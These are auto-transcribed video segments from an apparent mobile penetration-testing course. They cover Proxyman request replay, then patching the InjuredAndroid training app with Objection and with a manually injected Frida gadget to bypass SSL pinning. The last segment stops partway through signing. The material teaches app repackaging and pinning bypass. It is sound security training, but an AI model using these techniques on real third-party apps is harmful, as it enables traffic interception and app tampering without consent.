00:10:40.420 --> 00:10:44.940
You can try these different HTTP options like

260
00:10:44.940 --> 00:10:47.360
get post, put, patch, delete to see if

261
00:10:47.360 --> 00:10:52.780
the URL is actually properly sanitizing our inputs.

262
00:10:53.200 --> 00:10:55.000
And we can also make edits here to

263
00:10:55.000 --> 00:10:57.100
the URL to look for different things like

264
00:10:57.100 --> 00:10:57.400
that.

265
00:10:57.860 --> 00:10:59.480
So it's just a quick little way to

266
00:10:59.480 --> 00:11:02.060
edit and repeat requests.

267
00:11:02.480 --> 00:11:04.700
So for example here let's try the options.

268
00:11:06.160 --> 00:11:09.060
Send that and we should see this actually

269
00:11:09.060 --> 00:11:11.140
pop up back here in Proxyman.

270
00:11:11.480 --> 00:11:13.020
So you can see that our response has

271
00:11:13.020 --> 00:11:15.360
kind of changed between doing a get request

272
00:11:15.360 --> 00:11:17.840
and an options our connection closed here.

273
00:11:18.220 --> 00:11:19.880
So this is how you would actually use

274
00:11:19.880 --> 00:11:21.580
Proxyman to test as well.

275
00:11:21.580 --> 00:11:24.100
If you found a nice URL or something

276
00:11:24.100 --> 00:11:26.460
with a lot of parameters here, say for

277
00:11:26.460 --> 00:11:29.120
example here maybe, you can see there's some

278
00:11:29.120 --> 00:11:31.300
stuff in the body here in terms of

279
00:11:31.300 --> 00:11:31.680
headers.

280
00:11:32.380 --> 00:11:34.340
You could actually just try to repeat this

281
00:11:34.340 --> 00:11:38.100
request like enable the responses here and you

282
00:11:38.100 --> 00:11:41.740
could try to edit and repeat this as

283
00:11:41.740 --> 00:11:42.040
well.

284
00:11:42.660 --> 00:11:45.160
And you can also export these requests too.

285
00:11:45.340 --> 00:11:47.180
So if you saw something that's like a

286
00:11:47.180 --> 00:11:50.120
SQL injection possibly, you can export this as

287
00:11:50.120 --> 00:11:51.700
a raw request and then put it into

288
00:11:51.700 --> 00:11:54.380
other tools like Burp Suite or also SQL

289
00:11:54.380 --> 00:11:57.260
Map if you were looking at trying to

290
00:11:57.260 --> 00:12:00.840
get a raw repeat of that request.

291
00:12:01.060 --> 00:12:03.200
So this is just a general overview of

292
00:12:03.200 --> 00:12:03.840
Proxyman.

293
00:12:04.160 --> 00:12:05.320
Of course we're going to be running into

294
00:12:05.320 --> 00:12:08.040
lots of problems here because SSL pinning is

295
00:12:08.040 --> 00:12:10.440
enabled on a lot of these applications, but

296
00:12:10.440 --> 00:12:12.740
we would just inject into the application to

297
00:12:12.740 --> 00:12:14.740
bypass it similarly to Burp Suite.

298
00:12:15.280 --> 00:12:17.580
So I do find this tool very useful.

299
00:12:17.860 --> 00:12:19.440
It does help to make things a little

300
00:12:19.440 --> 00:12:21.820
bit easier, especially with this one-click setup

301
00:12:21.820 --> 00:12:24.440
when you're installing the certificates and changing the

302
00:12:24.440 --> 00:12:26.220
proxy settings for your devices.

303
00:12:26.880 --> 00:12:28.520
I think there's also ways that you can

304
00:12:28.520 --> 00:12:30.880
do scripting here to possibly send things to

305
00:12:30.880 --> 00:12:31.840
Burp Suite as well.

306
00:12:32.140 --> 00:12:33.940
So definitely something to look into as a

307
00:12:33.940 --> 00:12:36.180
pen tester and it's just a nice alternative

308
00:12:36.180 --> 00:12:38.520
proxy tool compared to Burp Suite.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.660 --> 00:00:03.300
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's get started actually patching an application

2
00:00:03.300 --> 00:00:05.640
with Frida so that we can bypass SSL

3
00:00:05.640 --> 00:00:08.240
pinning and perform some additional functions.

4
00:00:08.760 --> 00:00:11.480
So before we get started installing these two

5
00:00:11.480 --> 00:00:14.640
tools, let me clear out my command prompt

6
00:00:14.640 --> 00:00:14.900
here.

7
00:00:15.740 --> 00:00:18.700
I'm here in Google doing a search for

8
00:00:18.700 --> 00:00:19.740
Frida Android.

9
00:00:20.040 --> 00:00:22.040
You can see the documents are right here

10
00:00:22.040 --> 00:00:27.120
on frida.re.com and this is where

11
00:00:27.120 --> 00:00:29.580
you can find a tonne of documentation about

12
00:00:29.580 --> 00:00:30.620
Frida overall.

13
00:00:31.119 --> 00:00:33.360
The great thing about Frida is that this

14
00:00:33.360 --> 00:00:35.580
is a tool with a tonne of custom

15
00:00:35.580 --> 00:00:37.900
scripts as well that people have written various

16
00:00:37.900 --> 00:00:40.180
things for, so you can use Frida for

17
00:00:40.180 --> 00:00:42.060
a tonne of different scenarios.

18
00:00:42.560 --> 00:00:44.500
Now in our case in this video, we're

19
00:00:44.500 --> 00:00:45.920
not going to be too concerned with the

20
00:00:45.920 --> 00:00:47.560
website here, we're going to be trying to

21
00:00:47.560 --> 00:00:50.580
use Frida automatically by pairing it with another

22
00:00:50.580 --> 00:00:52.100
tool called Objection.

23
00:00:52.800 --> 00:00:55.780
But in the following video where we instal

24
00:00:55.780 --> 00:00:58.140
Frida manually, this is where we can go

25
00:00:58.140 --> 00:01:01.220
to read up more about Frida, understand how

26
00:01:01.220 --> 00:01:03.319
to instal it and use the Frida gadget

27
00:01:03.319 --> 00:01:06.160
inside of our application, but for now we're

28
00:01:06.160 --> 00:01:09.280
going to do the automatic part first and

29
00:01:09.280 --> 00:01:10.820
then go to the manual part.

30
00:01:11.300 --> 00:01:12.580
So I just want to give you these

31
00:01:12.580 --> 00:01:14.140
documents so you can go out there and

32
00:01:14.140 --> 00:01:16.540
read a lot more about Frida because this

33
00:01:16.540 --> 00:01:20.500
tool is extremely extensible and it also works

34
00:01:20.500 --> 00:01:22.680
on iOS as well and there's tonnes of

35
00:01:22.680 --> 00:01:24.280
scripts out there for Frida.

36
00:01:25.500 --> 00:01:27.040
The other tool we're going to be searching

37
00:01:27.040 --> 00:01:30.080
for on Google is Objection Android and it's

38
00:01:30.080 --> 00:01:34.780
Objection here by Sensepost, the runtime mobile exploration

39
00:01:34.780 --> 00:01:35.500
tool.

40
00:01:36.020 --> 00:01:37.640
And what this does is it's going to

41
00:01:37.640 --> 00:01:40.540
allow us to actually patch Frida into our

42
00:01:40.540 --> 00:01:42.120
application automatically.

43
00:01:42.620 --> 00:01:43.980
This is going to be the primary tool

44
00:01:43.980 --> 00:01:46.760
we'll be using here to explore the application

45
00:01:46.760 --> 00:01:50.460
once Frida is injected and also to put

46
00:01:50.460 --> 00:01:54.260
Frida into the application automatically.

47
00:01:54.520 --> 00:01:56.640
In the next video, again, we will be

48
00:01:56.640 --> 00:01:59.800
putting Frida into our application manually.

49
00:02:00.160 --> 00:02:02.480
So this is what's going to make it

50
00:02:02.480 --> 00:02:05.280
really easy, but you cannot always rely on

51
00:02:05.280 --> 00:02:07.580
Objection because sometimes you're going to end up

52
00:02:07.580 --> 00:02:10.860
getting errors or sometimes your application may not

53
00:02:10.860 --> 00:02:14.300
properly be signed or it might be missing

54
00:02:14.300 --> 00:02:16.360
some parts or it might still crash even

55
00:02:16.360 --> 00:02:18.040
after you use Objection.

56
00:02:18.680 --> 00:02:21.300
So usually when I'm working with a mobile

57
00:02:21.300 --> 00:02:23.820
application, I will try to patch it using

58
00:02:23.820 --> 00:02:26.420
Objection first and if that does not work,

59
00:02:26.600 --> 00:02:28.720
then I will go ahead and try to

60
00:02:28.720 --> 00:02:31.600
patch Frida manually into the application, which is

61
00:02:31.600 --> 00:02:32.560
going to be our next video.

62
00:02:33.400 --> 00:02:35.340
Okay, so first thing you need to have

63
00:02:35.340 --> 00:02:38.220
running is your Android emulator.

64
00:02:38.380 --> 00:02:39.660
We'll see why we need to have this

65
00:02:39.660 --> 00:02:41.180
running in just a few seconds.

66
00:02:41.800 --> 00:02:43.360
Next I'm going to go to my Windows

67
00:02:43.360 --> 00:02:44.480
command prompt here.

68
00:02:44.480 --> 00:02:47.340
And installing these tools is super easy.

69
00:02:47.520 --> 00:02:49.620
You need to have Python 3 installed with

70
00:02:49.620 --> 00:02:50.580
pip as well.

71
00:02:51.240 --> 00:02:52.660
I'm going to assume that you have those

72
00:02:52.660 --> 00:02:53.880
installed successfully.

73
00:02:54.360 --> 00:02:57.400
I'm going to do a pip3 instal frida

74
00:02:57.400 --> 00:02:58.820
-tools.

75
00:02:59.280 --> 00:03:00.980
And this is really that simple.

76
00:03:01.080 --> 00:03:03.340
It's going to download all the packages needed

77
00:03:03.340 --> 00:03:03.940
for Frida.

78
00:03:04.200 --> 00:03:06.220
To make sure that this works properly, we

79
00:03:06.220 --> 00:03:08.420
can just type Frida into our command prompt.

80
00:03:08.760 --> 00:03:11.600
You can see that it's looking for Frida

81
00:03:11.600 --> 00:03:13.240
right here and that's the manual.

82
00:03:13.620 --> 00:03:16.340
Now we can do a pip3 instal objection.

83
00:03:17.120 --> 00:03:19.380
And the order here is actually very important

84
00:03:19.380 --> 00:03:21.340
because we need to have the Frida tools

85
00:03:21.340 --> 00:03:23.620
installed before we instal objection.

86
00:03:24.260 --> 00:03:26.320
So make sure you do a pip3 instal

87
00:03:26.320 --> 00:03:29.620
frida-tools and then your pip3 instal objection.

88
00:03:30.060 --> 00:03:32.180
This is going to also download the packages

89
00:03:32.180 --> 00:03:32.640
here.

90
00:03:32.940 --> 00:03:34.760
To test it and make sure everything is

91
00:03:34.760 --> 00:03:36.640
good, we're just going to type objection into

92
00:03:36.640 --> 00:03:37.500
the command prompt.

93
00:03:37.880 --> 00:03:40.860
You can see that the tool has been

94
00:03:40.860 --> 00:03:42.080
installed successfully.

95
00:03:42.850 --> 00:03:44.960
Okay, so here I am in my APK

96
00:03:44.960 --> 00:03:48.360
folder and I have already downloaded the Injured

97
00:03:48.360 --> 00:03:49.560
Android application.

98
00:03:49.860 --> 00:03:51.900
Just like in the previous video where we

99
00:03:51.900 --> 00:03:54.100
downloaded it off the Google Play Store and

100
00:03:54.100 --> 00:03:56.760
took it here for static analysis, I have

101
00:03:56.760 --> 00:03:59.680
my Injured Android app here in my directory.

102
00:04:00.000 --> 00:04:04.200
It's right here, injuredandroid-pulled.apk. How we

103
00:04:04.200 --> 00:04:06.300
can patch this application now is we're going

104
00:04:06.300 --> 00:04:09.240
to do objection patch apk.

105
00:04:09.240 --> 00:04:14.440
You can also do a patch ipa if

106
00:04:14.440 --> 00:04:17.220
you were doing an iOS application as well,

107
00:04:17.320 --> 00:04:19.519
but in our case we're doing apk.

108
00:04:19.700 --> 00:04:21.860
Now dash dash source, and now we're going

109
00:04:21.860 --> 00:04:24.460
to specify the source of the file, which

110
00:04:24.460 --> 00:04:28.760
in our case is injuredandroid-pulled.apk. I'm

111
00:04:28.760 --> 00:04:29.820
going to press enter here.

112
00:04:30.100 --> 00:04:32.960
Now it's going to automatically detect the device

113
00:04:32.960 --> 00:04:33.600
architecture.

114
00:04:33.880 --> 00:04:36.420
This is literally our emulator running over here.

115
00:04:36.760 --> 00:04:39.320
It's going to pull the latest version of

116
00:04:39.320 --> 00:04:42.240
the Frida Gadget off of GitHub and try

117
00:04:42.240 --> 00:04:45.680
to decompile the application, inject the Frida Gadget,

118
00:04:46.480 --> 00:04:48.260
and run it on the app.

119
00:04:48.500 --> 00:04:48.920
Run it.

120
00:04:49.860 --> 00:04:52.860
Inject the Frida Gadget and recompile the application

121
00:04:52.860 --> 00:04:54.140
and sign it.

122
00:04:54.580 --> 00:04:57.360
So here it is copying the Frida Gadget

123
00:04:57.360 --> 00:04:58.800
to the library directory.

124
00:04:59.200 --> 00:05:01.200
We're going to do literally all of these

125
00:05:01.200 --> 00:05:03.580
steps manually in the next video so that

126
00:05:03.580 --> 00:05:06.580
you can understand exactly what objection actually did.

127
00:05:07.520 --> 00:05:09.240
You can see that it patched the Frida

128
00:05:09.240 --> 00:05:12.300
Gadget to this main activity.smally, which we're

129
00:05:12.300 --> 00:05:13.800
going to do in the next video.

130
00:05:16.380 --> 00:05:18.620
But the nice thing about objection is that

131
00:05:18.620 --> 00:05:20.520
this really takes the work out of doing

132
00:05:20.520 --> 00:05:20.740
it.

133
00:05:21.400 --> 00:05:24.280
Patching an application can usually take 20 to

134
00:05:24.280 --> 00:05:26.740
30 minutes depending on how experienced you are

135
00:05:26.740 --> 00:05:28.560
once you get the whole process down.

136
00:05:29.360 --> 00:05:32.820
It doesn't take as long, but objection definitely

137
00:05:32.820 --> 00:05:34.900
does make this easier, but the problem with

138
00:05:34.900 --> 00:05:38.000
objection is that sometimes it will not properly

139
00:05:38.000 --> 00:05:40.920
rebuild the application or it will be missing

140
00:05:40.920 --> 00:05:42.020
some parts potentially.

141
00:05:43.640 --> 00:05:46.580
This is going to save the new APK

142
00:05:46.580 --> 00:05:53.060
as injuredandroid underscore pull dot objection dot APK.

143
00:05:53.620 --> 00:05:55.320
So if I actually look in my file

144
00:05:55.320 --> 00:05:59.080
system now at this folder, we're going to

145
00:05:59.080 --> 00:06:04.200
have a new APK, this injuredandroid pull dot

146
00:06:04.200 --> 00:06:05.600
objection dot APK.

147
00:06:06.300 --> 00:06:08.880
When we're using objection, we can also specify

148
00:06:08.880 --> 00:06:12.360
the output file however we want to.

149
00:06:12.500 --> 00:06:13.580
I think we just had to give it

150
00:06:13.580 --> 00:06:15.960
a dash O or something like that, and

151
00:06:15.960 --> 00:06:18.480
we can like rename the application if we

152
00:06:18.480 --> 00:06:19.000
wanted to.

153
00:06:19.420 --> 00:06:22.400
So now that this APK is patched with

154
00:06:22.400 --> 00:06:24.240
Frida, I'm going to just drag it over

155
00:06:24.240 --> 00:06:28.600
to our Android emulator, and we see we

156
00:06:28.600 --> 00:06:31.020
got this insufficient storage, so now I need

157
00:06:31.020 --> 00:06:34.000
to actually delete some applications here, and actually

158
00:06:34.000 --> 00:06:37.080
I need to delete the injuredandroid application as

159
00:06:37.080 --> 00:06:39.520
well because otherwise it's not going to like

160
00:06:39.520 --> 00:06:41.340
to instal it doubly.

161
00:06:42.220 --> 00:06:46.590
Let's pull this over again, and now it

162
00:06:46.590 --> 00:06:49.950
says instal parse failed, no certificates, and this

163
00:06:49.950 --> 00:06:51.470
is one of the problems we can have

164
00:06:51.470 --> 00:06:54.510
with objection where it's not properly parsing the

165
00:06:54.510 --> 00:06:54.950
certificates.

166
00:06:55.410 --> 00:06:58.990
I've had this problem sometimes on some operating

167
00:06:58.990 --> 00:07:01.550
systems, sometimes on other ones it works just

168
00:07:01.550 --> 00:07:01.950
fine.

169
00:07:02.510 --> 00:07:04.590
So you might see this problem, and if

170
00:07:04.590 --> 00:07:06.590
this happens I would just recommend that you

171
00:07:06.590 --> 00:07:08.790
go to the next video and you understand

172
00:07:08.790 --> 00:07:13.030
how to inject Frida into the application manually.

173
00:07:13.610 --> 00:07:16.170
But I've noticed like 8 or 9 times

174
00:07:16.170 --> 00:07:19.170
out of 10 objection does usually work, but

175
00:07:19.170 --> 00:07:21.170
in this case for some reason I cannot

176
00:07:21.170 --> 00:07:23.030
get it to work on my Windows machine.

177
00:07:23.030 --> 00:07:24.930
I can always try this on a different

178
00:07:24.930 --> 00:07:27.770
operating system or my Kali Linux machine as

179
00:07:27.770 --> 00:07:28.090
well.

180
00:07:29.430 --> 00:07:33.170
But from here on, if the objection patching

181
00:07:33.170 --> 00:07:35.150
did not work successfully, you get an error

182
00:07:35.150 --> 00:07:37.070
like that, I would recommend you go over

183
00:07:37.070 --> 00:07:39.470
to the manual patching video, and we'll do

184
00:07:39.470 --> 00:07:44.230
exactly what objection did but manually to make

185
00:07:44.230 --> 00:07:46.850
sure the application is actually being signed appropriately.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.720 --> 00:00:02.380
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, now that we've had some experience with

2
00:00:02.380 --> 00:00:04.940
objection in Frida, let's learn how to actually

3
00:00:05.620 --> 00:00:08.780
inject Frida into an application manually.

4
00:00:09.380 --> 00:00:11.180
So here I am on my Kali Linux

5
00:00:11.180 --> 00:00:14.580
desktop and I already have the injured android

6
00:00:14.580 --> 00:00:15.680
apk here.

7
00:00:16.140 --> 00:00:18.860
Now you may already have this decompiled from

8
00:00:18.860 --> 00:00:21.340
the previous apk tool video when we took

9
00:00:21.340 --> 00:00:24.340
a look at the application manually using the

10
00:00:24.340 --> 00:00:27.430
apk tool, but for here I'm going to

11
00:00:27.430 --> 00:00:29.910
redo everything from the beginning again.

12
00:00:30.190 --> 00:00:33.070
I'm going to do apk tool d-r

13
00:00:33.070 --> 00:00:36.790
to not decompile the resources and then provide

14
00:00:36.790 --> 00:00:41.110
injured android 1.0 the release.apk. Okay

15
00:00:41.110 --> 00:00:42.290
I'm going to press enter here.

16
00:00:42.590 --> 00:00:45.810
It's going to start decompiling our application.

17
00:00:46.290 --> 00:00:48.290
It'll take just a second to do so.

18
00:00:48.550 --> 00:00:50.070
Now if I do an ls we can

19
00:00:50.070 --> 00:00:52.510
see that we have our injured android folder

20
00:00:52.510 --> 00:00:55.330
here yet again and I'm going to go

21
00:00:55.330 --> 00:00:57.590
here and open that up in the file

22
00:00:57.590 --> 00:00:58.130
explorer.

23
00:00:58.550 --> 00:01:00.530
So I'm going to go to desktop and

24
00:01:00.530 --> 00:01:02.070
now I'm in the folder right.

25
00:01:02.650 --> 00:01:04.590
Now what we're going to do with the

26
00:01:04.590 --> 00:01:06.890
Frida gadget is we're going to inject it

27
00:01:06.890 --> 00:01:10.290
into this lib folder and now we need

28
00:01:10.290 --> 00:01:12.830
to go and actually check what type of

29
00:01:12.830 --> 00:01:16.690
cpu architecture our android emulator is using.

30
00:01:17.050 --> 00:01:19.390
So I'm going to go here to the

31
00:01:19.390 --> 00:01:22.470
avd manager and I'm currently running the nexus

32
00:01:22.470 --> 00:01:24.070
5 api 21.

33
00:01:24.570 --> 00:01:26.690
We can see that the cpu architecture is

34
00:01:26.690 --> 00:01:29.250
x86 underscore 64.

35
00:01:30.010 --> 00:01:31.790
So what we're going to have to do

36
00:01:31.790 --> 00:01:33.970
is we're going to have to inject the

37
00:01:33.970 --> 00:01:37.550
Frida gadget into this folder in particular because

38
00:01:37.550 --> 00:01:41.010
this is the cpu architecture of our android

39
00:01:41.010 --> 00:01:41.710
emulator.

40
00:01:43.720 --> 00:01:45.860
Okay so this is the article we'll be

41
00:01:45.860 --> 00:01:48.380
using and following along with to inject Frida

42
00:01:48.380 --> 00:01:49.860
into our application.

43
00:01:50.100 --> 00:01:52.580
I will add the url into the course

44
00:01:52.580 --> 00:01:52.940
notes.

45
00:01:53.160 --> 00:01:54.920
I'm going to scroll down here it says

46
00:01:54.920 --> 00:01:56.780
the second step here is to decode the

47
00:01:56.780 --> 00:01:57.280
apk.

48
00:01:57.460 --> 00:01:58.960
We already did that in Kali Linux.

49
00:01:59.400 --> 00:02:02.060
Next we have to do a wget here

50
00:02:02.060 --> 00:02:05.080
for the exact type of Frida gadget that

51
00:02:05.080 --> 00:02:08.680
will be associated to our cpu architecture.

52
00:02:09.280 --> 00:02:11.820
Remember again according to what we have here

53
00:02:11.820 --> 00:02:14.620
in our avd manager we need the x86

54
00:02:14.620 --> 00:02:17.420
underscore 64 cpu type.

55
00:02:18.240 --> 00:02:20.340
Okay so now I'm going to go to

56
00:02:20.340 --> 00:02:25.390
Frida github, go down here and go to

57
00:02:25.390 --> 00:02:26.030
the releases.

58
00:02:27.850 --> 00:02:34.850
It should be Frida here, go to releases

59
00:02:35.640 --> 00:02:37.630
and you can see there's all types of

60
00:02:37.630 --> 00:02:38.690
different releases here.

61
00:02:38.810 --> 00:02:40.570
We have Frida core, we have Frida gadget,

62
00:02:40.730 --> 00:02:43.050
we have Frida gum, we even have Frida

63
00:02:43.050 --> 00:02:43.470
server.

64
00:02:43.830 --> 00:02:45.830
The one we're looking for is going to

65
00:02:45.830 --> 00:02:47.490
be the gadget and we want to get

66
00:02:47.490 --> 00:02:50.250
the one with x86 underscore 64.

67
00:02:50.790 --> 00:02:54.470
Here it is in our Frida gadget library

68
00:02:54.470 --> 00:02:54.930
here.

69
00:02:54.990 --> 00:02:57.550
You can also obviously do a ctrl f.

70
00:02:57.790 --> 00:03:00.690
So if I was looking for x86 underscore

71
00:03:00.690 --> 00:03:03.530
64 here I could see all the ones

72
00:03:03.530 --> 00:03:04.450
that might apply.

73
00:03:04.770 --> 00:03:07.210
In our case obviously we are using a

74
00:03:07.210 --> 00:03:09.850
android device so we need this one.

75
00:03:10.370 --> 00:03:12.370
Now I'm just going to copy this link

76
00:03:12.370 --> 00:03:15.090
address here, go back to my Kali machine

77
00:03:15.090 --> 00:03:18.490
and I'm going to do a wgit and

78
00:03:18.490 --> 00:03:21.370
to successfully download this gadget.

79
00:03:21.550 --> 00:03:23.910
So here we go the github.com Frida

80
00:03:23.910 --> 00:03:27.810
releases and it's for android x86 underscore 64.

81
00:03:29.250 --> 00:03:31.230
Okay so if I do an ls of

82
00:03:31.230 --> 00:03:33.570
my desktop now we can see that this

83
00:03:33.570 --> 00:03:34.610
file is here.

84
00:03:35.070 --> 00:03:38.070
Now to extract this you can either use

85
00:03:38.070 --> 00:03:40.910
like gunzip or you can also just go

86
00:03:40.910 --> 00:03:44.170
to the desktop here and right click it

87
00:03:44.170 --> 00:03:46.110
and extract it.

88
00:03:46.750 --> 00:03:50.770
It will take just a second here and

89
00:03:50.770 --> 00:03:54.250
we can see the fridagadget-15.1.1

90
00:03:54.250 --> 00:03:55.310
android blah blah blah.

91
00:03:55.810 --> 00:03:58.330
I'm going to rename this because we're going

92
00:03:58.330 --> 00:04:00.610
to have to do that for this to

93
00:04:00.610 --> 00:04:01.410
run successfully.

94
00:04:01.690 --> 00:04:03.870
I'm going to name it to just frida

95
00:04:03.870 --> 00:04:09.190
-gadget.so. Okay and you'll see why we

96
00:04:09.190 --> 00:04:10.790
need to do that in just a second.

97
00:04:11.090 --> 00:04:12.850
So now that we have the Frida gadget

98
00:04:12.850 --> 00:04:16.310
downloaded I'm going to cut this out of

99
00:04:16.310 --> 00:04:18.230
my desktop and we're going to go into

100
00:04:18.230 --> 00:04:21.150
the library folder here for our cpu architecture

101
00:04:21.150 --> 00:04:22.610
and paste.

102
00:04:22.910 --> 00:04:25.710
Now something very important to notice because I've

103
00:04:25.710 --> 00:04:28.550
had multiple applications crash on me because of

104
00:04:28.550 --> 00:04:28.830
this.

105
00:04:28.830 --> 00:04:32.030
You see how all of these libraries are

106
00:04:32.030 --> 00:04:36.790
indicated by the libblah.so. So we actually

107
00:04:36.790 --> 00:04:39.430
need to add that in this circumstance in

108
00:04:39.430 --> 00:04:41.090
front of our Frida gadget.

109
00:04:41.250 --> 00:04:45.510
So I'm going to do libfridagadget.so. Okay

110
00:04:45.510 --> 00:04:47.170
now this will be good to go.

111
00:04:47.390 --> 00:04:50.230
Now that we have the Frida gadget injected

112
00:04:50.230 --> 00:04:53.950
into the shared objects of our application we

113
00:04:53.950 --> 00:04:55.970
actually need to go in and change the

114
00:04:55.970 --> 00:04:56.450
source code.

115
00:04:56.510 --> 00:04:58.270
If we hop back to our article now

116
00:04:58.270 --> 00:05:01.910
it's going to say extract the compressed archive.

117
00:05:01.910 --> 00:05:02.910
We already did that.

118
00:05:03.250 --> 00:05:05.210
We already got our Frida gadget and we

119
00:05:05.210 --> 00:05:08.210
already moved it into the correct lib directory

120
00:05:08.210 --> 00:05:10.510
for our cpu architecture.

121
00:05:11.330 --> 00:05:12.730
So now what we need to do is

122
00:05:12.730 --> 00:05:14.450
take these two lines of code.

123
00:05:14.570 --> 00:05:17.050
You see how this says frida-gadget.

124
00:05:17.210 --> 00:05:19.350
This is what the code is going to

125
00:05:19.350 --> 00:05:22.130
be looking for when it's looking for that

126
00:05:22.130 --> 00:05:24.210
Frida gadget in the shared objects.

127
00:05:24.330 --> 00:05:27.850
Now it does not say libfridagadget but in

128
00:05:27.850 --> 00:05:30.390
our circumstance with the way that the application

129
00:05:30.390 --> 00:05:32.910
is there we needed to have that in

130
00:05:32.910 --> 00:05:34.250
the file name anyway.

131
00:05:35.150 --> 00:05:36.330
So I'm going to copy this.

132
00:05:36.550 --> 00:05:39.590
So it's really looking for libfridagadget when the

133
00:05:39.590 --> 00:05:43.310
application runs but in the actual code itself

134
00:05:43.310 --> 00:05:45.310
here it is just going to be frida

135
00:05:45.310 --> 00:05:46.870
-gadget just like that.

136
00:05:47.110 --> 00:05:48.890
So I'm going to copy this code and

137
00:05:48.890 --> 00:05:50.590
now what we need to do is actually

138
00:05:50.590 --> 00:05:54.030
inject this into the smally of our application.

139
00:05:54.530 --> 00:05:56.170
So I'm going to go to smally here

140
00:05:56.170 --> 00:05:58.130
and then bnack like kind of like what

141
00:05:58.130 --> 00:06:00.150
we did with the static analysis section.

142
00:06:00.410 --> 00:06:03.250
Enter android and here we want to find

143
00:06:03.250 --> 00:06:05.630
an activity that we know is going to

144
00:06:05.630 --> 00:06:08.190
be loaded at the beginning of the application

145
00:06:08.190 --> 00:06:10.930
and in our case this is going to

146
00:06:10.930 --> 00:06:13.410
be the main activity and here is the

147
00:06:13.410 --> 00:06:17.530
main activity.smally. Now for any given application

148
00:06:17.530 --> 00:06:19.590
this could really be like anything like maybe

149
00:06:19.590 --> 00:06:22.770
an onboarding activity, maybe a main activity, something

150
00:06:22.770 --> 00:06:24.750
like that, something that you know is going

151
00:06:24.750 --> 00:06:26.610
to be popping up as soon as the

152
00:06:26.610 --> 00:06:27.670
application starts.

153
00:06:28.050 --> 00:06:29.870
So I'm going to double click this with

154
00:06:29.870 --> 00:06:32.550
Kali Linux and it's going to open the

155
00:06:32.550 --> 00:06:34.530
smally file and this is what the smally

156
00:06:34.530 --> 00:06:35.670
actually looks for.

157
00:06:36.150 --> 00:06:38.130
And now what we're looking for is something

158
00:06:38.130 --> 00:06:41.710
like this method public constructor here and right

159
00:06:41.710 --> 00:06:44.350
before this return void we're going to paste

160
00:06:44.350 --> 00:06:45.830
our two lines of code.

161
00:06:46.050 --> 00:06:48.870
So we're adding our constant string v0, frida

162
00:06:48.870 --> 00:06:51.310
-gadget, invoke static, blah blah blah, that's going

163
00:06:51.310 --> 00:06:53.730
to invoke our shared object.

164
00:06:53.890 --> 00:06:57.190
Now I'm going to save this file and

165
00:06:57.190 --> 00:06:58.790
I'm just going to close that and reopen

166
00:06:58.790 --> 00:07:00.670
it again to make sure that our source

167
00:07:00.670 --> 00:07:01.790
code is still there.

168
00:07:01.970 --> 00:07:04.330
So now we have actually modified the source

169
00:07:04.330 --> 00:07:07.090
code of the application, the main activity, the

170
00:07:07.090 --> 00:07:10.190
main landing page of the injured android application,

171
00:07:10.530 --> 00:07:12.290
so that it's going to be calling our

172
00:07:12.290 --> 00:07:13.990
frida-gadget in the background.

173
00:07:14.490 --> 00:07:18.050
And we've also injected into our library of

174
00:07:18.050 --> 00:07:23.350
the application the frida-gadget shared object, right?

175
00:07:23.390 --> 00:07:24.930
So this is what it's going to be

176
00:07:24.930 --> 00:07:27.130
reaching out to when the application runs.

177
00:07:27.570 --> 00:07:30.330
So now we have everything we need modified

178
00:07:30.330 --> 00:07:35.550
inside of our application for the application to

179
00:07:35.550 --> 00:07:38.110
run successfully and to call the frida-gadget.

180
00:07:38.490 --> 00:07:40.090
So now we can go through the process

181
00:07:40.090 --> 00:07:43.130
of rebuilding our application with the altered source

182
00:07:43.130 --> 00:07:43.370
code.

183
00:07:43.510 --> 00:07:44.370
I'm going to close this.

184
00:07:45.190 --> 00:07:45.650
There we go.

185
00:07:45.690 --> 00:07:47.230
I had to do a dash o to

186
00:07:47.230 --> 00:07:49.750
output this as the injured underscore patch dot

187
00:07:49.750 --> 00:07:50.350
apk.

188
00:07:50.850 --> 00:07:52.410
It should take a second to rebuild this

189
00:07:52.410 --> 00:07:54.450
now and actually put it out into the

190
00:07:54.450 --> 00:07:57.430
proper format and with the correctly named.

191
00:07:58.230 --> 00:07:58.990
There we go.

192
00:07:59.110 --> 00:08:01.070
Injured patch dot apk is there now.

193
00:08:01.170 --> 00:08:02.590
So make sure that you do your dash

194
00:08:02.590 --> 00:08:04.370
o if you want to output the file

195
00:08:04.370 --> 00:08:07.530
as something recognizable here.

196
00:08:07.590 --> 00:08:09.750
So you can differentiate it between what you

197
00:08:09.750 --> 00:08:12.470
had downloaded and used and what you had

198
00:08:12.470 --> 00:08:14.110
edited and everything like that.

199
00:08:14.550 --> 00:08:16.450
Okay, going back to our article now.

200
00:08:17.270 --> 00:08:20.010
So something else to mention too is that

201
00:08:20.010 --> 00:08:22.290
if your application did not have the internet

202
00:08:22.290 --> 00:08:24.230
permission, you might need to add that for

203
00:08:24.230 --> 00:08:25.950
the frida-gadget to work properly.

204
00:08:26.370 --> 00:08:27.830
In our case, we already know that this

205
00:08:27.830 --> 00:08:28.730
permission was there.

206
00:08:29.070 --> 00:08:30.850
So we've already done this stage here to

207
00:08:30.850 --> 00:08:34.190
repackage the application and output it as, in

208
00:08:34.190 --> 00:08:36.610
this case, they did repacked dot apk.

209
00:08:37.049 --> 00:08:39.909
In our case, we outputted it as injured

210
00:08:39.909 --> 00:08:41.830
underscore patch dot apk.

211
00:08:42.490 --> 00:08:44.970
Okay, scrolling down, now we need to sign

212
00:08:44.970 --> 00:08:47.730
the apk using our own keys and zip

213
00:08:47.730 --> 00:08:48.050
align.

214
00:08:48.450 --> 00:08:50.070
So I'm going to copy this command that

215
00:08:50.070 --> 00:08:53.470
says keytool dash keygen dash v dash keystore.

216
00:08:53.610 --> 00:08:56.110
They named their keystore custom dot keystore.

217
00:08:56.370 --> 00:08:58.610
They gave it an alias of my key

218
00:08:58.610 --> 00:08:59.530
alias name.

219
00:09:00.010 --> 00:09:02.210
You can really name these things anything that

220
00:09:02.210 --> 00:09:02.710
you want.

221
00:09:02.810 --> 00:09:04.970
What we're doing here is we're creating a

222
00:09:04.970 --> 00:09:07.250
a keystore that we're going to be signing

223
00:09:07.250 --> 00:09:08.650
the application with.

224
00:09:09.030 --> 00:09:10.790
